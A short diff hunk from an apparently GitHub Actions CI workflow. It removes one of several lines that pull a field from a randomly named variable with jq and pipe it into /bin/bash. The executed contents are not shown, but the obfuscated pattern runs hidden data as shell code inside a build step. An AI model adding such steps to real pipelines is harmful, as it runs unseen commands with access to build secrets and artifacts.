@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$a4" | jq -r .n673 | /bin/bash
           echo $b2 | jq -r .y98 | /bin/bash
           echo $iil0 | jq -r .oqynv9275 | /bin/bash
-          echo $tkrvf53767 | jq -r .ooy3574 | /bin/bash
           printf '%s' "$n20" | jq -r .w82 | /bin/bash
 
       - name: Store artifact
